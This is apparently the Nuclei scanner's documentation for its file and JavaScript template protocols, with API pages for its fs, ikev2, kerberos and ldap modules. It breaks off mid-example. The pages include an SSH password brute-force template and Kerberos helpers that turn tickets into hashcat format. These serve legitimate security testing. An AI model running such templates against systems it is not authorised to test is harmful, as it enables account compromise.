# Start of file template block
file:

```

[​](#extensions)Extensions
--------------------------

To match on all extensions (except the ones in default denylist), use the following -

```
extensions:
  - all

```

You can also provide a list of custom extensions that should be matched upon.

```
extensions:
  - py
  - go

```

A denylist of extensions can also be provided. Files with these extensions will not be processed by nuclei.

```
extensions:
  - all

denylist:
  - go
  - py
  - txt

```

By default, certain extensions are excluded in nuclei file module. A list of these is provided below-

```
3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,
flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,
mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,
rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,
woff,woff2,xcf,xls,xlsx,zip

```

[​](#more-options)More Options
------------------------------

**max-size** parameter can be provided which limits the maximum size (in bytes) of files read by nuclei engine.

As default the `max-size` value is 5 MB (5242880), Files larger than the `max-size` will not be processed.

---

**no-recursive** option disables recursive walking of directories / globs while input is being processed for file module of nuclei.

[​](#matchers-extractors)Matchers / Extractors
----------------------------------------------

**File** protocol supports 2 types of Matchers -

| Matcher Type | Part Matched |
| --- | --- |
| word | all |
| regex | all |

| Extractors Type | Part Matched |
| --- | --- |
| word | all |
| regex | all |

[​](#example-file-template)**Example File Template**
----------------------------------------------------

The final example template file for a Private Key detection is provided below.

```
id: google-api-key

info:
  name: Google API Key
  author: pdteam
  severity: info

file:
  - extensions:
      - all
      - txt

    extractors:
      - type: regex
        name: google-api-key
        regex:
          - "AIza[0-9A-Za-z\\-_]{35}"

```

```
# Running file template on http-response/ directory
nuclei -t file.yaml -file -target http-response/

# Running file template on output.txt
nuclei -t file.yaml -file -target output.txt

```

More complete examples are provided [here](/templates/protocols/file-examples)


JavaScript

JavaScript Protocol Introduction
================================

Learn more about using JavaScript with Nuclei v3

[​](#introduction)Introduction
------------------------------

Nuclei and the ProjectDiscovery community thrive on the ability to write exploits/checks in a fast and simple YAML format. We work consistently to improve our **Nuclei templates** to encourage those as the standard for writing security checks. We understand the limitations and are always working to address those, while we work on expanding our capabilities.

Nuclei currently supports writing templates for complex HTTP, DNS, SSL protocol exploits/checks through a powerful and easy to use DSL in the Nuclei engine. However, we understand the current support may not be enough for addressing vulnerabilities across all protocols and in non-remote domains of security like local privilege escalation checks, kernel etc.

To address this, Nuclei v3 includes an embedded runtime for JavaScript that is tailored for **Nuclei** with the help of **[Goja](https://github.com/dop251/goja)**.

[​](#features)Features
----------------------

**Support for provider or driver-specific exploits**

Some vulnerabilities are specific to software or a driver. For example, a Redis buffer overflow exploit, an exploit of specific VPN software, or exploits that are not part of the Internet Engineering Task Force (IETF) standard protocols.

Since these are not standard protocols they are not typically added to Nuclei. Detection for these types of exploits cannot be written using a ‘network’ protocol.
They are often very complex to write and detection for these exploits can be written by exposing the required library in Nuclei (if not already present). We now provide support for writing detection of these types of exploits with JavaScript.

**Non-network checks**

Security is not limited to network exploits. Nuclei provides support for security beyond network issues like:

* Local privilege escalation checks
* Kernel exploits
* Account misconfigurations
* System misconfigurations

**Complex network protocol exploits**

Some network exploits are very complex to write due to nature of the protocol or exploit itself. For example [CVE-2020-0796](https://nvd.nist.gov/vuln/detail/cve-2020-0796) requires you to manually construct a packet.
Detection for these exploits is usually written in Python but now can be written in JavaScript.

**Multi-step exploits**

LDAP or Kerberos exploits usually involve a multi-step process of authentication and are difficult to write in YAML-based DSL. JavaScript support makes this easier.

**Scalable and maintainable exploits**

One off exploit detection written in code are not scalable and maintainable due to nature of language, boilerplate code, and other factors. Our goal is to provide the tools to allow you to write the **minimum** code required to run detection of the exploit and let Nuclei do the rest.

**Leveraging Turing complete language**

While YAML-based DSL is powerful and easy to use it is not Turing complete and has its own limitations. Javascript is Turing complete thus users who are already familiar with JavaScript can write network and other detection of exploits without learning new DSL or hacking around existing DSL.

[​](#requirements)Requirements
------------------------------

* A basic knowledge of JavaScript (loops, functions, arrays) is required to write a JavaScript protocol template
* Nuclei v3.0.0 or above


JavaScript

JavaScript Protocol
===================

Review examples of JavaScript with Nuclei v3

The JavaScript protocol was added to Nuclei v3 to allow you to write checks and detections for exploits in JavaScript and to bridge the gap between network protocols.

* Internally any content written using the JavaScript protocol is executed in Golang.
* The JavaScript protocol is **not** intended to fit into or be imported with any existing JavaScript libraries or frameworks outside of the Nuclei ecosystem.
* Nuclei provides a set of functions, libraries that are tailor-made for writing exploits and checks and only adds required/necessary functionality to complement existing YAML-based DSL.
* The JavaScript protocol is **not** intended to be used as a general purpose JavaScript runtime and does not replace matchers, extractors, or any existing functionality of Nuclei.
* Nuclei v3.0.0 ships with **15+ libraries (ssh, ftp, RDP, Kerberos, and Redis)** tailored for writing exploits and checks in JavaScript and will be continuously expanded in the future.

[​](#simple-example)Simple Example
----------------------------------

Here is a basic example of a JavaScript protocol template:

```
id: ssh-server-fingerprint

info:
  name: Fingerprint SSH Server Software
  author: Ice3man543,tarunKoyalwar
  severity: info
  

javascript:
  - code: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      var response = c.ConnectSSHInfoMode(Host, Port);
      to_json(response);
    args:
      Host: "{{Host}}"
      Port: "22"

    extractors:
      - type: json
        json:
          - '.ServerID.Raw'

```

In the Nuclei template example above, we are fingerprinting SSH server software by connecting in non-auth mode and extracting the server banner. Let’s break down the template.

### [​](#code-section)Code Section

The `code:` contains actual JavaScript code that is executed by Nuclei at runtime. In the above template, we are:

* Importing `nuclei/ssh` module/library
* Creating a new instance of `SSHClient` object
* Connecting to SSH server in `Info` mode
* Converting response to json

### [​](#args-section)Args Section

The `args:` section can be simply understood as variables in JavaScript that are passed at runtime and support DSL usage.

### [​](#output-section)Output Section

The value of the last expression is returned as the output of JavaScript protocol template and can be used in matchers and extractors. If the server returns an error instead, then the `error` variable is exposed in the matcher or extractor with an error message.

[​](#ssh-bruteforce-example)SSH Bruteforce Example
--------------------------------------------------

**SSH Password Bruteforce Template**

```
id: ssh-brute

info:
  name: SSH Credential Stuffing
  author: tarunKoyalwar
  severity: critical
  

javascript:
  - pre-condition: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      var response = c.ConnectSSHInfoMode(Host, Port);
      // only bruteforce if ssh server allows password based authentication
      response["UserAuth"].includes("password")

    code: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      c.Connect(Host,Port,Username,Password);

    args:
      Host: "{{Host}}"
      Port: "22"
      Username: "{{usernames}}"
      Password: "{{passwords}}"

    threads: 10
    attack: clusterbomb
    payloads:
      usernames: helpers/wordlists/wp-users.txt
      passwords: helpers/wordlists/wp-passwords.txt

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "response == true"
          - "success == true"
        condition: and

```

In the example template above, we are bruteforcing ssh server with a list of usernames and passwords. We can tell that this might not have been possible to achieve with the network template. Let’s break down the template.

### [​](#pre-condition)Pre-Condition

`pre-condition` is an optional section of JavaScript code that is executed before running “code” and acts as a pre-condition to exploit. In the above template, before attempting brute force, we check if:

* The address is actually an SSH server.
* The ssh server is configured to allow password-based authentication.

**Further explanation**

* If pre-condition returns `true` only then `code` is executed; otherwise, it is skipped.
* In the code section, we import `nuclei/ssh` module and create a new instance of `SSHClient` object.
* Then we attempt to connect to the ssh server with a username and password.
  This template uses [payloads](https://docs.projectdiscovery.io/templates/protocols/http/http-payloads) to launch a clusterbomb attack with 10 threads and exits on the first match.

Looking at this template now, we can tell that JavaScript templates are powerful for writing multistep and protocol/vendor-specific exploits, which is a primary goal of the JavaScript protocol.

[​](#init)Init
--------------

`init` is an optional JavaScript section that can be used to initialize the template, and it is executed just after compiling the template and before running it on any target. Although it is rarely needed, it can be used to load and preprocess data before running a template on any target.

For example, in the below code block, we are loading all ssh private keys from `nuclei-templates/helpers` directory and storing them as a variable in payloads with the name `keys`. If we were loading private keys from the “pre-condition” code block, then it would have been loaded for every target, which is not ideal.

```
variables:
  keysDir: "helpers/"  # load all private keys from this directory

javascript:
    # init field can be used to make any preperations before the actual exploit
    # here we are reading all private keys from helpers folder and storing them in a list
  - init: |
      let m = require('nuclei/fs');
      let privatekeys = m.ReadFilesFromDir(keysDir)
      updatePayload('keys',privatekeys)

    payloads:
      # 'keys' will be updated by actual private keys after init is executed
      keys: 
        - key1
        - key2

```

Two special functions that are available in the `init` block are

| Function | Description |
| --- | --- |
| `updatePayload(key,value)` | updates payload with given key and value |
| `set(key,value)` | sets a variable with given key and value |

A collection of JavaScript protocol templates can be found [here](https://github.com/projectdiscovery/nuclei-templates/pull/8530).


Modules

Bytes
=====

[​](#namespace-bytes)Namespace: bytes
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [Buffer](/templates/protocols/javascript/modules/bytes.Buffer)


Modules

Fs
==

[​](#namespace-fs)Namespace: fs
===============================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#functions)Functions

* [ListDir](/templates/protocols/javascript/modules/fs#listdir)
* [ReadFile](/templates/protocols/javascript/modules/fs#readfile)
* [ReadFileAsString](/templates/protocols/javascript/modules/fs#readfileasstring)
* [ReadFilesFromDir](/templates/protocols/javascript/modules/fs#readfilesfromdir)

[​](#functions-2)Functions
--------------------------

### [​](#listdir)ListDir

▸ **ListDir**(`path`, `itemType`): `string`[] | `null`

ListDir lists itemType values within a directory
depending on the itemType provided
itemType can be any one of [‘file’,‘dir’,”]

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `path` | `string` |
| `itemType` | `string` |

#### [​](#returns)Returns

`string`[] | `null`

**`Example`**

```
const fs = require('nuclei/fs');
// this will only return files in /tmp directory
const files = fs.ListDir('/tmp', 'file');

```

**`Example`**

```
const fs = require('nuclei/fs');
// this will only return directories in /tmp directory
const dirs = fs.ListDir('/tmp', 'dir');

```

**`Example`**

```
const fs = require('nuclei/fs');
// when no itemType is provided, it will return both files and directories
const items = fs.ListDir('/tmp');

```
#### [​](#defined-in)Defined in

fs.ts:26

---

### [​](#readfile)ReadFile

▸ **ReadFile**(`path`): `Uint8Array` | `null`

ReadFile reads file contents within permitted paths
and returns content as byte array

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `path` | `string` |

#### [​](#returns-2)Returns

`Uint8Array` | `null`

**`Example`**

```
const fs = require('nuclei/fs');
// here permitted directories are $HOME/nuclei-templates/*
const content = fs.ReadFile('helpers/usernames.txt');

```
#### [​](#defined-in-2)Defined in

fs.ts:42

---

### [​](#readfileasstring)ReadFileAsString

▸ **ReadFileAsString**(`path`): `string` | `null`

ReadFileAsString reads file contents within permitted paths
and returns content as string

#### [​](#parameters-3)Parameters

| Name | Type |
| --- | --- |
| `path` | `string` |

#### [​](#returns-3)Returns

`string` | `null`

**`Example`**

```
const fs = require('nuclei/fs');
// here permitted directories are $HOME/nuclei-templates/*
const content = fs.ReadFileAsString('helpers/usernames.txt');

```
#### [​](#defined-in-3)Defined in

fs.ts:58

---

### [​](#readfilesfromdir)ReadFilesFromDir

▸ **ReadFilesFromDir**(`dir`): `string`[] | `null`

ReadFilesFromDir reads all files from a directory
and returns a string array with file contents of all files

#### [​](#parameters-4)Parameters

| Name | Type |
| --- | --- |
| `dir` | `string` |

#### [​](#returns-4)Returns

`string`[] | `null`

**`Example`**

```
const fs = require('nuclei/fs');
// here permitted directories are $HOME/nuclei-templates/*
const contents = fs.ReadFilesFromDir('helpers/ssh-keys');
log(contents);

```
#### [​](#defined-in-4)Defined in

fs.ts:75


Modules

Ikev2
=====

[​](#namespace-ikev2)Namespace: ikev2
=====================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [IKEMessage](/templates/protocols/javascript/modules/ikev2.IKEMessage)

### [​](#interfaces)Interfaces

* [IKENonce](/templates/protocols/javascript/modules/ikev2.IKENonce)
* [IKENotification](/templates/protocols/javascript/modules/ikev2.IKENotification)

### [​](#variables)Variables

* [IKE\_EXCHANGE\_AUTH](/templates/protocols/javascript/modules/ikev2#ike_exchange_auth)
* [IKE\_EXCHANGE\_CREATE\_CHILD\_SA](/templates/protocols/javascript/modules/ikev2#ike_exchange_create_child_sa)
* [IKE\_EXCHANGE\_INFORMATIONAL](/templates/protocols/javascript/modules/ikev2#ike_exchange_informational)
* [IKE\_EXCHANGE\_SA\_INIT](/templates/protocols/javascript/modules/ikev2#ike_exchange_sa_init)
* [IKE\_FLAGS\_InitiatorBitCheck](/templates/protocols/javascript/modules/ikev2#ike_flags_initiatorbitcheck)
* [IKE\_NOTIFY\_NO\_PROPOSAL\_CHOSEN](/templates/protocols/javascript/modules/ikev2#ike_notify_no_proposal_chosen)
* [IKE\_NOTIFY\_USE\_TRANSPORT\_MODE](/templates/protocols/javascript/modules/ikev2#ike_notify_use_transport_mode)
* [IKE\_VERSION\_2](/templates/protocols/javascript/modules/ikev2#ike_version_2)

[​](#variables-2)Variables
--------------------------

### [​](#ike-exchange-auth)IKE\_EXCHANGE\_AUTH

• `Const` **IKE\_EXCHANGE\_AUTH**: `35`

#### [​](#defined-in)Defined in

ikev2.ts:4

---

### [​](#ike-exchange-create-child-sa)IKE\_EXCHANGE\_CREATE\_CHILD\_SA

• `Const` **IKE\_EXCHANGE\_CREATE\_CHILD\_SA**: `36`

#### [​](#defined-in-2)Defined in

ikev2.ts:7

---

### [​](#ike-exchange-informational)IKE\_EXCHANGE\_INFORMATIONAL

• `Const` **IKE\_EXCHANGE\_INFORMATIONAL**: `37`

#### [​](#defined-in-3)Defined in

ikev2.ts:10

---

### [​](#ike-exchange-sa-init)IKE\_EXCHANGE\_SA\_INIT

• `Const` **IKE\_EXCHANGE\_SA\_INIT**: `34`

#### [​](#defined-in-4)Defined in

ikev2.ts:13

---

### [​](#ike-flags-initiatorbitcheck)IKE\_FLAGS\_InitiatorBitCheck

• `Const` **IKE\_FLAGS\_InitiatorBitCheck**: `8`

#### [​](#defined-in-5)Defined in

ikev2.ts:16

---

### [​](#ike-notify-no-proposal-chosen)IKE\_NOTIFY\_NO\_PROPOSAL\_CHOSEN

• `Const` **IKE\_NOTIFY\_NO\_PROPOSAL\_CHOSEN**: `14`

#### [​](#defined-in-6)Defined in

ikev2.ts:19

---

### [​](#ike-notify-use-transport-mode)IKE\_NOTIFY\_USE\_TRANSPORT\_MODE

• `Const` **IKE\_NOTIFY\_USE\_TRANSPORT\_MODE**: `16391`

#### [​](#defined-in-7)Defined in

ikev2.ts:22

---

### [​](#ike-version-2)IKE\_VERSION\_2

• `Const` **IKE\_VERSION\_2**: `32`

#### [​](#defined-in-8)Defined in

ikev2.ts:25


Modules

Kerberos
========

[​](#namespace-kerberos)Namespace: kerberos
===========================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [Client](/templates/protocols/javascript/modules/kerberos.Client)
* [Config](/templates/protocols/javascript/modules/kerberos.Config)

### [​](#interfaces)Interfaces

* [AuthorizationDataEntry](/templates/protocols/javascript/modules/kerberos.AuthorizationDataEntry)
* [BitString](/templates/protocols/javascript/modules/kerberos.BitString)
* [EncTicketPart](/templates/protocols/javascript/modules/kerberos.EncTicketPart)
* [EncryptedData](/templates/protocols/javascript/modules/kerberos.EncryptedData)
* [EncryptionKey](/templates/protocols/javascript/modules/kerberos.EncryptionKey)
* [EnumerateUserResponse](/templates/protocols/javascript/modules/kerberos.EnumerateUserResponse)
* [HostAddress](/templates/protocols/javascript/modules/kerberos.HostAddress)
* [LibDefaults](/templates/protocols/javascript/modules/kerberos.LibDefaults)
* [PrincipalName](/templates/protocols/javascript/modules/kerberos.PrincipalName)
* [Realm](/templates/protocols/javascript/modules/kerberos.Realm)
* [TGS](/templates/protocols/javascript/modules/kerberos.TGS)
* [Ticket](/templates/protocols/javascript/modules/kerberos.Ticket)
* [TransitedEncoding](/templates/protocols/javascript/modules/kerberos.TransitedEncoding)

### [​](#functions)Functions

* [ASRepToHashcat](/templates/protocols/javascript/modules/kerberos#asreptohashcat)
* [CheckKrbError](/templates/protocols/javascript/modules/kerberos#checkkrberror)
* [NewKerberosClientFromString](/templates/protocols/javascript/modules/kerberos#newkerberosclientfromstring)
* [SendToKDC](/templates/protocols/javascript/modules/kerberos#sendtokdc)
* [TGStoHashcat](/templates/protocols/javascript/modules/kerberos#tgstohashcat)

[​](#functions-2)Functions
--------------------------

### [​](#asreptohashcat)ASRepToHashcat

▸ **ASRepToHashcat**(`asrep`): `string` | `null`

ASRepToHashcat converts an AS-REP message to a hashcat format

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `asrep` | `any` |

#### [​](#returns)Returns

`string` | `null`

#### [​](#defined-in)Defined in

kerberos.ts:6

---

### [​](#checkkrberror)CheckKrbError

▸ **CheckKrbError**(`b`): `Uint8Array` | `null`

CheckKrbError checks if the response bytes from the KDC are a KRBError.

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `b` | `Uint8Array` |

#### [​](#returns-2)Returns

`Uint8Array` | `null`

#### [​](#defined-in-2)Defined in

kerberos.ts:15

---

### [​](#newkerberosclientfromstring)NewKerberosClientFromString

▸ **NewKerberosClientFromString**(`cfg`): [`Client`](/templates/protocols/javascript/modules/kerberos.Client) | `null`

NewKerberosClientFromString creates a new kerberos client from a string
by parsing krb5.conf

#### [​](#parameters-3)Parameters

| Name | Type |
| --- | --- |
| `cfg` | `string` |

#### [​](#returns-3)Returns

[`Client`](/templates/protocols/javascript/modules/kerberos.Client) | `null`

**`Example`**

```
const kerberos = require('nuclei/kerberos');
const client = kerberos.NewKerberosClientFromString(`
[libdefaults]
default_realm = ACME.COM
dns_lookup_kdc = true
`);

```
#### [​](#defined-in-3)Defined in

kerberos.ts:34

---

### [​](#sendtokdc)SendToKDC

▸ **SendToKDC**(`kclient`, `msg`): `string` | `null`

sendtokdc.go deals with actual sending and receiving responses from KDC
SendToKDC sends a message to the KDC and returns the response.
It first tries to send the message over TCP, and if that fails, it falls back to UDP.(and vice versa)

#### [​](#parameters-4)Parameters

| Name | Type |
| --- | --- |
| `kclient` | [`Client`](/templates/protocols/javascript/modules/kerberos.Client) |
| `msg` | `string` |

#### [​](#returns-4)Returns

`string` | `null`

**`Example`**

```
const kerberos = require('nuclei/kerberos');
const client = new kerberos.Client('acme.com');
const response = kerberos.SendToKDC(client, 'message');

```
#### [​](#defined-in-4)Defined in

kerberos.ts:51

---

### [​](#tgstohashcat)TGStoHashcat

▸ **TGStoHashcat**(`tgs`, `username`): `string` | `null`

TGStoHashcat converts a TGS to a hashcat format.

#### [​](#parameters-5)Parameters

| Name | Type |
| --- | --- |
| `tgs` | `any` |
| `username` | `string` |

#### [​](#returns-5)Returns

`string` | `null`

#### [​](#defined-in-5)Defined in

kerberos.ts:60


Modules

Ldap
====

[​](#namespace-ldap)Namespace: ldap
===================================

[​](#table-of-contents)Table of contents
----------------------------------------

### [​](#classes)Classes

* [Client](/templates/protocols/javascript/modules/ldap.Client)

### [​](#interfaces)Interfaces

* [Config](/templates/protocols/javascript/modules/ldap.Config)
* [LdapAttributes](/templates/protocols/javascript/modules/ldap.LdapAttributes)
* [LdapEntry](/templates/protocols/javascript/modules/ldap.LdapEntry)
* [Metadata](/templates/protocols/javascript/modules/ldap.Metadata)
* [SearchResult](/templates/protocols/javascript/modules/ldap.SearchResult)

### [​](#variables)Variables

* [FilterAccountDisabled](/templates/protocols/javascript/modules/ldap#filteraccountdisabled)
* [FilterAccountEnabled](/templates/protocols/javascript/modules/ldap#filteraccountenabled)
* [FilterCanSendEncryptedPassword](/templates/protocols/javascript/modules/ldap#filtercansendencryptedpassword)
* [FilterDontExpirePassword](/templates/protocols/javascript/modules/ldap#filterdontexpirepassword)
* [FilterDontRequirePreauth](/templates/protocols/javascript/modules/ldap#filterdontrequirepreauth)
* [FilterHasServicePrincipalName](/templates/protocols/javascript/modules/ldap#filterhasserviceprincipalname)
* [FilterHomedirRequired](/templates/protocols/javascript/modules/ldap#filterhomedirrequired)
* [FilterInterdomainTrustAccount](/templates/protocols/javascript/modules/ldap#filterinterdomaintrustaccount)
* [FilterIsAdmin](/templates/protocols/javascript/modules/ldap#filterisadmin)
* [FilterIsComputer](/templates/protocols/javascript/modules/ldap#filteriscomputer)
* [FilterIsDuplicateAccount](/templates/protocols/javascript/modules/ldap#filterisduplicateaccount)
* [FilterIsGroup](/templates/protocols/javascript/modules/ldap#filterisgroup)
* [FilterIsNormalAccount](/templates/protocols/javascript/modules/ldap#filterisnormalaccount)
* [FilterIsPerson](/templates/protocols/javascript/modules/ldap#filterisperson)
* [FilterLockout](/templates/protocols/javascript/modules/ldap#filterlockout)
* [FilterLogonScript](/templates/protocols/javascript/modules/ldap#filterlogonscript)
* [FilterMnsLogonAccount](/templates/protocols/javascript/modules/ldap#filtermnslogonaccount)
* [FilterNotDelegated](/templates/protocols/javascript/modules/ldap#filternotdelegated)
* [FilterPartialSecretsAccount](/templates/protocols/javascript/modules/ldap#filterpartialsecretsaccount)
* [FilterPasswordCantChange](/templates/protocols/javascript/modules/ldap#filterpasswordcantchange)
* [FilterPasswordExpired](/templates/protocols/javascript/modules/ldap#filterpasswordexpired)
* [FilterPasswordNotRequired](/templates/protocols/javascript/modules/ldap#filterpasswordnotrequired)
* [FilterServerTrustAccount](/templates/protocols/javascript/modules/ldap#filterservertrustaccount)
* [FilterSmartCardRequired](/templates/protocols/javascript/modules/ldap#filtersmartcardrequired)
* [FilterTrustedForDelegation](/templates/protocols/javascript/modules/ldap#filtertrustedfordelegation)
* [FilterTrustedToAuthForDelegation](/templates/protocols/javascript/modules/ldap#filtertrustedtoauthfordelegation)
* [FilterUseDesKeyOnly](/templates/protocols/javascript/modules/ldap#filterusedeskeyonly)
* [FilterWorkstationTrustAccount](/templates/protocols/javascript/modules/ldap#filterworkstationtrustaccount)

### [​](#functions)Functions

* [DecodeADTimestamp](/templates/protocols/javascript/modules/ldap#decodeadtimestamp)
* [DecodeSID](/templates/protocols/javascript/modules/ldap#decodesid)
* [DecodeZuluTimestamp](/templates/protocols/javascript/modules/ldap#decodezulutimestamp)
* [JoinFilters](/templates/protocols/javascript/modules/ldap#joinfilters)
* [NegativeFilter](/templates/protocols/javascript/modules/ldap#negativefilter)

[​](#variables-2)Variables
--------------------------

### [​](#filteraccountdisabled)FilterAccountDisabled

• `Const` **FilterAccountDisabled**: `"(userAccountControl:1.2.840.113556.1.4.803:=2)"`

The user account is disabled.

#### [​](#defined-in)Defined in

ldap.ts:4

---

### [​](#filteraccountenabled)FilterAccountEnabled

• `Const` **FilterAccountEnabled**: `"(!(userAccountControl:1.2.840.113556.1.4.803:=2))"`

The user account is enabled.

#### [​](#defined-in-2)Defined in

ldap.ts:7

---

### [​](#filtercansendencryptedpassword)FilterCanSendEncryptedPassword

• `Const` **FilterCanSendEncryptedPassword**: `"(userAccountControl:1.2.840.113556.1.4.803:=128)"`

The user can send an encrypted password.

#### [​](#defined-in-3)Defined in

ldap.ts:10

---

### [​](#filterdontexpirepassword)FilterDontExpirePassword

• `Const` **FilterDontExpirePassword**: `"(userAccountControl:1.2.840.113556.1.4.803:=65536)"`

Represents the password, which should never expire on the account.

#### [​](#defined-in-4)Defined in

ldap.ts:13

---

### [​](#filterdontrequirepreauth)FilterDontRequirePreauth

• `Const` **FilterDontRequirePreauth**: `"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`

This account doesn’t require Kerberos pre-authentication for logging on.

#### [​](#defined-in-5)Defined in

ldap.ts:16

---

### [​](#filterhasserviceprincipalname)FilterHasServicePrincipalName

• `Const` **FilterHasServicePrincipalName**: `"(servicePrincipalName=*)"`

The object has a service principal name.

#### [​](#defined-in-6)Defined in

ldap.ts:19

---

### [​](#filterhomedirrequired)FilterHomedirRequired

• `Const` **FilterHomedirRequired**: `"(userAccountControl:1.2.840.113556.1.4.803:=8)"`

The home folder is required.

#### [​](#defined-in-7)Defined in

ldap.ts:22

---

### [​](#filterinterdomaintrustaccount)FilterInterdomainTrustAccount

• `Const` **FilterInterdomainTrustAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=2048)"`

It’s a permit to trust an account for a system domain that trusts other domains.

#### [​](#defined-in-8)Defined in

ldap.ts:25

---

### [​](#filterisadmin)FilterIsAdmin

• `Const` **FilterIsAdmin**: `"(adminCount=1)"`

The object is an admin.

#### [​](#defined-in-9)Defined in

ldap.ts:28

---

### [​](#filteriscomputer)FilterIsComputer

• `Const` **FilterIsComputer**: `"(objectCategory=computer)"`

The object is a computer.

#### [​](#defined-in-10)Defined in

ldap.ts:31

---

### [​](#filterisduplicateaccount)FilterIsDuplicateAccount

• `Const` **FilterIsDuplicateAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=256)"`

It’s an account for users whose primary account is in another domain.

#### [​](#defined-in-11)Defined in

ldap.ts:34

---

### [​](#filterisgroup)FilterIsGroup

• `Const` **FilterIsGroup**: `"(objectCategory=group)"`

The object is a group.

#### [​](#defined-in-12)Defined in

ldap.ts:37

---

### [​](#filterisnormalaccount)FilterIsNormalAccount

• `Const` **FilterIsNormalAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=512)"`

It’s a default account type that represents a typical user.

#### [​](#defined-in-13)Defined in

ldap.ts:40

---

### [​](#filterisperson)FilterIsPerson

• `Const` **FilterIsPerson**: `"(objectCategory=person)"`

The object is a person.

#### [​](#defined-in-14)Defined in

ldap.ts:43

---

### [​](#filterlockout)FilterLockout

• `Const` **FilterLockout**: `"(userAccountControl:1.2.840.113556.1.4.803:=16)"`

The user is locked out.

#### [​](#defined-in-15)Defined in

ldap.ts:46

---

### [​](#filterlogonscript)FilterLogonScript

• `Const` **FilterLogonScript**: `"(userAccountControl:1.2.840.113556.1.4.803:=1)"`

The logon script will be run.

#### [​](#defined-in-16)Defined in

ldap.ts:49

---

### [​](#filtermnslogonaccount)FilterMnsLogonAccount

• `Const` **FilterMnsLogonAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=131072)"`

It’s an MNS logon account.

#### [​](#defined-in-17)Defined in

ldap.ts:52

---

### [​](#filternotdelegated)FilterNotDelegated

• `Const` **FilterNotDelegated**: `"(userAccountControl:1.2.840.113556.1.4.803:=1048576)"`

When this flag is set, the security context of the user isn’t delegated to a service even if the service account is set as trusted for Kerberos delegation.

#### [​](#defined-in-18)Defined in

ldap.ts:55

---

### [​](#filterpartialsecretsaccount)FilterPartialSecretsAccount

• `Const` **FilterPartialSecretsAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=67108864)"`

The account is a read-only domain controller (RODC).

#### [​](#defined-in-19)Defined in

ldap.ts:58

---

### [​](#filterpasswordcantchange)FilterPasswordCantChange

• `Const` **FilterPasswordCantChange**: `"(userAccountControl:1.2.840.113556.1.4.803:=64)"`

The user can’t change the password.

#### [​](#defined-in-20)Defined in

ldap.ts:61

---

### [​](#filterpasswordexpired)FilterPasswordExpired

• `Const` **FilterPasswordExpired**: `"(userAccountControl:1.2.840.113556.1.4.803:=8388608)"`

The user’s password has expired.

#### [​](#defined-in-21)Defined in

ldap.ts:64

---

### [​](#filterpasswordnotrequired)FilterPasswordNotRequired

• `Const` **FilterPasswordNotRequired**: `"(userAccountControl:1.2.840.113556.1.4.803:=32)"`

No password is required.

#### [​](#defined-in-22)Defined in

ldap.ts:67

---

### [​](#filterservertrustaccount)FilterServerTrustAccount

• `Const` **FilterServerTrustAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=8192)"`

It’s a computer account for a domain controller that is a member of this domain.

#### [​](#defined-in-23)Defined in

ldap.ts:70

---

### [​](#filtersmartcardrequired)FilterSmartCardRequired

• `Const` **FilterSmartCardRequired**: `"(userAccountControl:1.2.840.113556.1.4.803:=262144)"`

When this flag is set, it forces the user to log on by using a smart card.

#### [​](#defined-in-24)Defined in

ldap.ts:73

---

### [​](#filtertrustedfordelegation)FilterTrustedForDelegation

• `Const` **FilterTrustedForDelegation**: `"(userAccountControl:1.2.840.113556.1.4.803:=524288)"`

When this flag is set, the service account (the user or computer account) under which a service runs is trusted for Kerberos delegation.

#### [​](#defined-in-25)Defined in

ldap.ts:76

---

### [​](#filtertrustedtoauthfordelegation)FilterTrustedToAuthForDelegation

• `Const` **FilterTrustedToAuthForDelegation**: `"(userAccountControl:1.2.840.113556.1.4.803:=16777216)"`

The account is enabled for delegation.

#### [​](#defined-in-26)Defined in

ldap.ts:79

---

### [​](#filterusedeskeyonly)FilterUseDesKeyOnly

• `Const` **FilterUseDesKeyOnly**: `"(userAccountControl:1.2.840.113556.1.4.803:=2097152)"`

Restrict this principal to use only Data Encryption Standard (DES) encryption types for keys.

#### [​](#defined-in-27)Defined in

ldap.ts:82

---

### [​](#filterworkstationtrustaccount)FilterWorkstationTrustAccount

• `Const` **FilterWorkstationTrustAccount**: `"(userAccountControl:1.2.840.113556.1.4.803:=4096)"`

It’s a computer account for a computer that is running old Windows builds.

#### [​](#defined-in-28)Defined in

ldap.ts:85

[​](#functions-2)Functions
--------------------------

### [​](#decodeadtimestamp)DecodeADTimestamp

▸ **DecodeADTimestamp**(`timestamp`): `string`

DecodeADTimestamp decodes an Active Directory timestamp

#### [​](#parameters)Parameters

| Name | Type |
| --- | --- |
| `timestamp` | `string` |

#### [​](#returns)Returns

`string`

**`Example`**

```
const ldap = require('nuclei/ldap');
const timestamp = ldap.DecodeADTimestamp('132036744000000000');
log(timestamp);

```
#### [​](#defined-in-29)Defined in

ldap.ts:96

---

### [​](#decodesid)DecodeSID

▸ **DecodeSID**(`s`): `string`

DecodeSID decodes a SID string

#### [​](#parameters-2)Parameters

| Name | Type |
| --- | --- |
| `s` | `string` |

#### [​](#returns-2)Returns

`string`

**`Example`**

```
const ldap = require('nuclei/ldap');
